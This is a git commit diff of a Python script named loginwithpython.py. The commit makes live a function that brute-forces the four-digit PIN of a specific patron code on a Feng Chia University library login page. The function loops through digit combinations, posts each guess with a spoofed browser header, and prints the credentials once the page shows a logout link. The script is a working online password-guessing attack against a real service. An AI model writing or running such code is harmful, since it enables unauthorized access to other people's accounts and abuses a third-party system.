99700a026f41e4954a88007a4a4edaf8f372f255
Your Name <you@example.com>
2022-05-06 19:31:12 +0800

    03

--- 0506/loginwithpython.py
+++ 0506/loginwithpython.py
@@ -4,7 +4,7 @@ import random
 from time import sleep
 import requests
 
-url = 'https://innopac.lib.fcu.edu.tw/patroninfo*cht'
+url = 'https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top'
 payloads = {
     'code': 'd0948511',
     'pin': '5',
@@ -12,45 +12,40 @@ payloads = {
 }
 seesion = requests.session()
 flag = 0
-'''for i in range(9,0,-1):
-    if flag==1:
-        break
-    elif flag==0:
-        for j in range(2,0,-1):
-            if flag==1:
-                break
-            if flag==0:
-                for k in range(9,0,-1):
-                    if flag==1:
-                        break
-                    if flag==0:
-                        for l in range(9,0,-1):
-                            if flag==1:
-                                break
-                            
-                            payloads['pin']=str(i)+str(j)+str(k)+str(l)
-                            print(f'{payloads}')
-                            sleep(1.5)
-                            header={
-                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
-                            }
-                            #p = requests.post(url, data=payloads,headers=header)
-                            seesion.post(url, headers = header, data = payloads)
-                            response = seesion.get('https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top', headers = header)
-                            #print(response.text)
-                            if '登出' in response.text:
-                                flag=1
-                                print('1')
-                                
-                # print the html returned or something more intelligent to see if it's a successful login page.
-             '''
+list = [[0]*100, [0]*100]
 
 
+def loop():
+    for i in range(9, 0, -1):
+        for j in range(2, 0, -1):
+            for k in range(9, 0, -1):
+                for l in range(9, 0, -1):
+                    sleep(1.5)
+                    payloads['pin'] = str(i)+str(j)+str(k)+str(l)
+                    print(f'{payloads}')
+                    header = {
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
+                    }
+                    # p = requests.post(url, data=payloads,headers=header)
+                    seesion.post(url, headers=header, data=payloads)
+                    response = seesion.get(
+                        'https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top', headers=header)
+                    # print(response.text)
+                    if '登出' in response.text:
+                        flag = 1
+                        print('成功登入')
+                        print(f'{payloads}')
+                        return
+
+    # print the html returned or something more intelligent to see if it's a successful login page.
+
+
+loop()
 header = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
-}         
-cnt=0      # An authorised request.
-while 1:
+}
+cnt = 0      # An authorised request.
+'''while 1:
     cnt+=1
     sleep(1)
     if cnt%2==0:
@@ -59,13 +54,13 @@ while 1:
         n=random.randint(1,10)
         payloads['pin']=str(n)
     print(payloads)
-    seesion.post(url, headers = header, data = payloads)
-    response = seesion.get(
-        'https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top', headers=header)
-    if '登出' in response.text:
-        print('成功登入')
-    with open("renren3.html", "w", encoding="utf-8") as f:
-        f.write(response.content.decode())
-    print(f'cnt is {cnt}')
+    seesion.post(url, headers = header, data = payloads)'''
+response = seesion.get(
+    'https://innopac.lib.fcu.edu.tw/patroninfo~S9*cht/1178687/top', headers=header)
+if '登出' in response.text:
+    print('成功登入')
+with open("renren3.html", "w", encoding="utf-8") as f:
+    f.write(response.content.decode())
+print(f'cnt is {cnt}')
 # blk-pat-info
 #
